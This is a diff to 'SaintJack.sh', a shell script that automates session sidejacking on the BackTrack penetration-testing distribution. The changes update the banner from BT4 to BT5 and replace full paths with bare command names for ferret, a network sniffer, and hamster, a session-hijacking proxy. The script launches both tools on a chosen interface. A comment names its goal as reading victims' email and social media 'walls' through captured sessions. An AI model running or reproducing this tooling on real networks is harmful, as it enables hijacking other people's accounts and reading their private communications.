@@ -14,7 +14,7 @@ function banner ()
 {
 clear
 echo -e "\t#############################################################"
-echo -e "\t######**++++SaintJack.sh ver. 1.0 for BT4++++++++++**########"
+echo -e "\t######**++++SaintJack.sh ver. 1.0 for BT5++++++++++**########"
 echo -e "\t#an ordianry side jacking automation shell script by ch!m3ra#"
 echo -e "\t########+++++http://chimera40.wordpress.com+++###############"
 echo -e "\t#___________________________________________________________#"
@@ -134,12 +134,12 @@ sleep 3
 echo "Done!"
 echo -e "\033[1;32m[4]Running ferret the sniffer on $interface..........\033[1;37m"
 #start the two twins ferret the sniffer,
-xterm -title "Mr. ferret" -bg black -bd red3 -fg green3 -e "/pentest/sniffers/hamster/ferret -i $interface" &
+xterm -title "Mr. ferret" -bg black -bd red3 -fg green3 -e "ferret -i $interface" &
 sleep 3
 echo "Done!"
 #start hamster the proxy
 echo -e "\033[1;32m[5]finaly setting up ferret twin sister hamster;)..........\033[1;37m"
-xterm -title "I am ferret the proxy" -bg black -bd red3 -fg green3 -e "/pentest/sniffers/hamster/hamster" &
+xterm -title "I am ferret the proxy" -bg black -bd red3 -fg green3 -e "hamster" &
 sleep 3
 echo "Done!"
  #if every thing went O.K then all should be well so we start the juicy part read them mails and walls
